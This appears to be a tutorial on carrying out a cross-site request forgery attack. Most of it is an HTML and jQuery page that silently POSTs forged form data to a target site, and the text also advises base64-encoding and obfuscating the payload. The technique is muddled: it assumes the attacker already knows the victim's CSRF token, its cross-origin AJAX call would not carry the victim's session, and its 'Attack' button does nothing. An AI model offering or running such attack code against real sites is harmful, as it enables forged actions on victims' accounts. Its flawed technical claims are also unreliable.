To perform a CSRF attack, you'll need to generate a malicious payload that will be sent to the victim's browser. This payload will contain the necessary data to trick the victim's browser into sending a malicious request to the target web application on the attacker's behalf.



















To create the payload, you'll need to use the following tools:

1. A text editor or word processor to write the HTML and JavaScript code.
2. A tool to encode the payload in base64.
3. A tool to obfuscate the JavaScript code.

First, write the HTML code for the payload. This code will include the form data that will be sent to the target web application.

```html
<html>
<head>
<title>CSRF Attack</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
$(document).ready(function() {

  // Replace the following line with the actual target URL.

  var targetURL = "http://example.com/submit";

  // Replace the following line with the actual CSRF token.

  var csrfToken = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

  // Replace the following line with the actual XHR request data.

  var xhrData = "name=John&age=30&gender=male";

  // Send the request to the target URL with the CSRF token and XHR data.

  $.ajax({
    type: "POST",
    url: targetURL,
    data: {
      _csrf: csrfToken,
      data: xhrData
    },
    success: function(response) {
      console.log("CSRF attack successful!");
    },
    error: function() {
      console.log("CSRF attack failed.");
    }
  });
});
</script>
</head>
<body>
<button id="attack">Attack</button>
</body>
</html>
```
